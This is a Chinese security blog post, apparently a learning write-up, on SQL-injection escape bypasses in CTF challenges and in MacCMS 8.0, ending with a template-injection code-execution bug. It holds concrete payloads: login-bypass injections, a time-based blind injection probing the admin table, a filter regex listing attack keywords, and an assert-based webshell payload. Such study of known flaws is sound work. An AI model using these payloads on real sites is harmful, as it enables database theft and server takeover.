@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>Maccms8.0 sql getshell | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面"><span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-text">0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03"><span class="toc-text">0x03</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#验证漏洞"><span class="toc-text">验证漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04"><span class="toc-text">0x04</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#任意代码执行"><span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell-payload"><span class="toc-text">getshell_payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后还是没复现成功-真的是很心塞啊"><span class="toc-text">最后还是没复现成功,真的是很心塞啊!</span></a></li></ol>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Maccms8.0 sql getshell</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 17, 2018&nbsp;&nbsp;16:52:11</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>​         红日安全的代码审计文章写的确实很好.打算跟着这些文章慢慢复现,开启代码审计之路吧.<br>第一篇<a href="http://sec-redclub.com/archives/975/" target="_blank" rel="noopener">http://sec-redclub.com/archives/975/</a> PS:我是从最近的文章开始复现.</p>
+<a id="more"></a>
+
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>​         该文章一开始贴上了一题CTF题具体的分析还是看文章吧.</p>
+<p>​          自我总结一下漏洞的产生</p>
+<p>​          传入的参数username,password都有经过sanitizeinput()函数处理.该函数主要功能是,先对传入的参数用addslashes()函数转义特殊字符,例如单引号.然后再substr()截取20个字符.</p>
+<p>​          那么问题来了</p>
+<p>​           假设我们输入值为 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789123456789’   // 注意最后有个单引号</span><br></pre></td></tr></table></figure>
+
+<p>​           这时通过addslashes()函数的处理就会变成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789123456789\’  // 一共21个字符</span><br></pre></td></tr></table></figure>
+
+<p>​           然后在用substr()截取出20个字符, 则变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789123456789\</span><br></pre></td></tr></table></figure>
+
+<p>​            接着查看sql部分的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(p) from user u where user = <span class="string">'$username'</span> <span class="keyword">AND</span> password = <span class="string">'$pass'</span></span><br></pre></td></tr></table></figure>
+
+<p>​            当我们将构造的20个字符输入到username里,则语句变为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(p) from user u where user = <span class="string">'1234567890123456789\' AND password = '</span>$pass<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p>​           由于反斜杆可以把单引号转义,也就是user的内容变为了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234567890123456789</span>\<span class="string">' AND password =</span></span><br></pre></td></tr></table></figure>
+
+<p>​              使得了绕过了防御从而产生注入.</p>
+<p>​               最终我们的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">'&amp;passwd=or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>理解了这题之后,突然想起南京邮电大学上有一题似乎类似,于是就按照相同的原理去做了一遍</p>
+<p>题目  <a href="http://chinalover.sinaapp.com/web15/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web15/index.php</a></p>
+<p>题目给的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">$str=stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出username和passworde都被clean函数处理过.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes()：对输入字符串中的某些预定义字符前添加反斜杠，这样处理是为了数据库查询语句等的需要。这些预定义字符是：单引号 (<span class="string">') ，双引号 (") ，反斜杠 (\) ，NULL</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripslashes()：删除由 addslashes() 函数添加的反斜杠。该函数用于清理从数据库或 HTML 表单中取回的数据。(若是连续二个反斜杠，则去掉一个，保留一个；若只有一个反斜杠，就直接去掉。)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">默认情况下，PHP 指令 magic_quotes_gpc 为 on，对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们传入的值已经被addslashes()函数处理了,可是为了防止双层转义get_magic_quotes_gpc()方法调用了stripslashes()将由addslashes()产生的反斜杠去除.</p>
+<p>当我们构造了  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username =\ &amp;password= <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>语句成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name='</span> \<span class="string">' AND pass='</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>%<span class="number">23</span><span class="string">';   '</span>;</span><br></pre></td></tr></table></figure>
+
+<p> 可以看出 单引号闭合以后name的内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">' AND pass=</span></span><br></pre></td></tr></table></figure>
+
+<p>因此成功绕过了防护</p>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>实例分析  苹果CMS视频分享程序8.0</p>
+<p>说实话我看不出这为啥存在注入….文章里说明显存在.. 可能我还是太菜了.</p>
+<p>问题代码 inc/common/template.php  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($lp[<span class="string">'wd'</span>]))&#123;</span><br><span class="line">   $where .= <span class="string">' AND ( instr(a_name,\''</span>.$lp[<span class="string">'wd'</span>].<span class="string">'\')&gt;0 or instr(a_subname,\''</span>.$lp[<span class="string">'wd'</span>].<span class="string">'\')&gt;0 ) '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看看<strong>lp</strong>的值来源过来的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;P[<span class="string">"wd"</span>]))&#123; $lp[<span class="string">'wd'</span>]  = <span class="keyword">$this</span>-&gt;P[<span class="string">"wd"</span>]; <span class="keyword">$this</span>-&gt;P[<span class="string">"auto"</span>] = <span class="keyword">true</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>lp[“wd”]的值有P[“wd”]赋值.<br>寻找一下P[“wd”]<br><strong>inc/module/vod.php</strong>发现给<strong>PW[“wd”]</strong>传值语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($method==<span class="string">'search'</span>)</span><br><span class="line">&#123;</span><br><span class="line">   $tpl-&gt;C[<span class="string">"siteaid"</span>] = <span class="number">15</span>;</span><br><span class="line">   $wd = trim(be(<span class="string">"all"</span>, <span class="string">"wd"</span>)); $wd = chkSql($wd);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($wd))&#123; $tpl-&gt;P[<span class="string">"wd"</span>] = $wd; &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> ( $tpl-&gt;P[<span class="string">'pg'</span>]==<span class="number">1</span> &amp;&amp; getTimeSpan(<span class="string">"last_searchtime"</span>) &lt; $MAC[<span class="string">'app'</span>][<span class="string">'searchtime'</span>])&#123; </span><br><span class="line">      showMsg(<span class="string">"请不要频繁操作，时间间隔为"</span>.$MAC[<span class="string">'app'</span>][<span class="string">'searchtime'</span>].<span class="string">"秒"</span>,MAC_PATH);</span><br><span class="line">      <span class="keyword">exit</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上代码可以看出<strong>wd</strong>参数事先经过了<strong>be()</strong>函数处理,跟进一下be()函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">be</span><span class="params">($mode,$key,$sp=<span class="string">','</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   ini_set(<span class="string">"magic_quotes_runtime"</span>, <span class="number">0</span>);</span><br><span class="line">   $magicq= get_magic_quotes_gpc();</span><br><span class="line">   <span class="keyword">switch</span>($mode)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'post'</span>:</span><br><span class="line">         $res=<span class="keyword">isset</span>($_POST[$key]) ? $magicq?$_POST[$key]:@addslashes($_POST[$key]) : <span class="string">''</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'get'</span>:</span><br><span class="line">         $res=<span class="keyword">isset</span>($_GET[$key]) ? $magicq?$_GET[$key]:@addslashes($_GET[$key]) : <span class="string">''</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'arr'</span>:</span><br><span class="line">         $arr =<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : <span class="string">''</span>;</span><br><span class="line">         <span class="keyword">if</span>($arr==<span class="string">""</span>)&#123;</span><br><span class="line">            $value=<span class="string">"0"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($arr);$i++)&#123;</span><br><span class="line">               $res=implode($sp,$arr);</span><br><span class="line">            &#125; </span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">         $res=<span class="keyword">isset</span>($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] : @addslashes($_REQUEST[$key]) : <span class="string">''</span>;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>该函数可以看出be()是对各种传参方式的数据进行过滤清洗<br>在看看be函数被调用的时候的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">be(<span class="string">"all"</span>, <span class="string">"wd"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结合以上代码可以得到 <strong>wd</strong>是通过<strong>REQUEST</strong>方法将参数传入,并且用<strong>addslashes()</strong>进行转义.这里其实不太可能出现注入点了.<br>当<strong>be</strong>处理结束以后调用<strong>chksql()</strong>函数<br>将参数进行url解码<br>检测是否存在注入,其中有个自定义的函数<strong>StopAttack(1,$s,$getfilter)</strong>;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkSql</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">global</span> $getfilter;</span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">empty</span>($s))&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   $d=$s;</span><br><span class="line">   <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">      $s = urldecode($d);</span><br><span class="line">      <span class="keyword">if</span>($s==$d)&#123;</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      $d = $s;</span><br><span class="line">   &#125;</span><br><span class="line">   StopAttack(<span class="number">1</span>,$s,$getfilter);</span><br><span class="line">   <span class="keyword">return</span> htmlEncode($s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用正则检测是否存在攻击语句语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $errmsg = <span class="string">"&lt;div style=\"position:fixed;top:0px;width:100%;height:100%;background-color:white;color:green;font-weight:bold;border-bottom:5px solid #999;\"&gt;&lt;br&gt;您的提交带有不合法参数,谢谢合作!&lt;br&gt;操作IP: "</span>.$_SERVER[<span class="string">"REMOTE_ADDR"</span>].<span class="string">"&lt;br&gt;操作时间: "</span>.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>).<span class="string">"&lt;br&gt;操作页面:"</span>.$_SERVER[<span class="string">"PHP_SELF"</span>].<span class="string">"&lt;br&gt;提交方式: "</span>.$_SERVER[<span class="string">"REQUEST_METHOD"</span>].<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">   $StrFiltValue=arr_foreach($StrFiltValue);</span><br><span class="line">   $StrFiltValue=urldecode($StrFiltValue);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span> $errmsg;</span><br><span class="line">      <span class="keyword">exit</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltKey)==<span class="number">1</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span> $errmsg;</span><br><span class="line">      <span class="keyword">exit</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>变量<strong>getfiter</strong>的内容.很明显用来匹配攻击语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getfilter = <span class="string">"\\&lt;.+javascript:window\\[.&#123;1&#125;\\\\x|&lt;.*=(&amp;#\\d+?;?)+?&gt;|&lt;.*(data|src)=data:text\\/html.*&gt;|\\b(alert\\(|be\\(|eval\\(|confirm\\(|expression\\(|prompt\\(|benchmark\s*?\(.*\)|sleep\s*?\(.*\)|load_file\s*?\\()|&lt;[a-z]+?\\b[^&gt;]*?\\bon([a-z]&#123;4,&#125;)\s*?=|^\\+\\/v(8|9)|\\b(and|or)\\b\\s*?([\\(\\)'\"\\d]+?=[\\(\\)'\"\\d]+?|[\\(\\)'\"a-zA-Z]+?=[\\(\\)'\"a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\"'])|\\/\\*.*\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT(\\(.+\\)|\\s+?.+?)|UPDATE(\\(.+\\)|\\s+?.+?)SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE)(\\(.+\\)|\\s+?.+?\\s+?)FROM(\\(.+\\)|\\s+?.+?)|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)|UNION([\s\S]*?)SELECT|_get|_post|_request|_cookie|eval|assert|base64_decode|file_get_contents|file_put_contents|fopen|chr|strtr|pack|gzuncompress|preg_replace|\\&#123;if|\\&#123;else|\\&#123;|\\&#125;|:php"</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>chksql()</strong>函数的返回值调用了一个<strong>htmlEncode()</strong><br>跟进看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEncode</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (!isN($str))&#123;</span><br><span class="line">      $str = str_replace(chr(<span class="number">38</span>), <span class="string">"&amp;#38;"</span>,$str);</span><br><span class="line">      $str = str_replace(<span class="string">"&gt;"</span>, <span class="string">"&amp;gt;"</span>,$str);</span><br><span class="line">      $str = str_replace(<span class="string">"&lt;"</span>, <span class="string">"&amp;lt;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">39</span>), <span class="string">"&amp;#39;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">32</span>), <span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">34</span>), <span class="string">"&amp;quot;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">9</span>), <span class="string">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">13</span>), <span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">      $str = str_replace(chr(<span class="number">10</span>), <span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这个函数是对 <strong>&amp; 、 ‘ 、 空格 、 “ 、 TAB 、 回车 、 换行 、 大于小于号</strong> 进行<strong>html实体编码</strong>,遗漏了反斜杠,还有其他空白符号.<br>现在回顾一下我们有什么条件可利用<br>首先<strong>wd</strong>是通过<strong>request</strong>传参数,<br>在如下语句中拼接进sql语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($lp[<span class="string">'wd'</span>]))&#123;</span><br><span class="line">   $where .= <span class="string">' AND ( instr(a_name,\''</span>.$lp[<span class="string">'wd'</span>].<span class="string">'\')&gt;0 or instr(a_subname,\''</span>.$lp[<span class="string">'wd'</span>].<span class="string">'\')&gt;0 ) '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>危险字符经过实体编码和<strong>addslashes()</strong>的处理,但是实体编码遗漏了反斜杠,而addslashes是在url解码之前做转义,所以我们双重url解码之后就可以绕过adslashes函数,也就是说我们可以利用反斜杠<strong>去转义单引号,就回到了文章开头的知识点.</strong></p>
+<h3 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h3><p>可能我真的是脸黑,不知道什么原因漏洞没复现成功.原理大概理解了.又得偷图唉..</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">))||<span class="keyword">if</span>((select%<span class="number">0</span>b(select(m_name)``from(mac_manager))regexp(<span class="number">0x5e61</span>)),(`sleep`(<span class="number">3</span>)),<span class="number">0</span>)<span class="comment">#%25%35%63</span></span><br></pre></td></tr></table></figure>
+
+<p>拼接进语句以后</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$where .= <span class="string">' AND ( instr(a_name,\'))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63 \')&gt;0 or instr(a_subname,\'))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63\')&gt;0 ) '</span>;</span><br></pre></td></tr></table></figure>
+
+<p>整理一下的语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span> ( instr(a_name,<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#\ '</span>)&gt;<span class="number">0</span> <span class="keyword">or</span> instr(a_subname,<span class="string">'))  /////这边是单引号闭合部分</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0) 有效部分</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#%25%35%63'</span>)&gt;<span class="number">0</span> ) <span class="comment">////// 后面都被注释掉了</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="E:maccms%5C1.png" alt></p>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h3><p>在复现以上漏洞的时候查了一些博客,发现这个CMS还存在任意代码执行,但是已经被修复了,就是添加了<strong>StopAttack()</strong>这个函数之后解决了这个问题.<br>把该函数注释掉以后就可以复现该漏洞了.<br>问题还是出在wd的参数可控构造满足正则的语句就可以被执行</p>
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd=&#123;<span class="keyword">if</span>-A:phpinfo()&#125;&#123;<span class="keyword">endif</span>-A&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这是可以执行phpinfo()的.把phpinfo()换成其他语句就可以getshell了</p>
+<p><img src="maccms/2.png" alt></p>
+<h3 id="getshell-payload"><a href="#getshell-payload" class="headerlink" title="getshell_payload"></a>getshell_payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wd=&#123;<span class="keyword">if</span>-A:assert($_POST[zhhhy])&#125;&#123;<span class="keyword">endif</span>-A&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="maccms/3.png" alt></p>
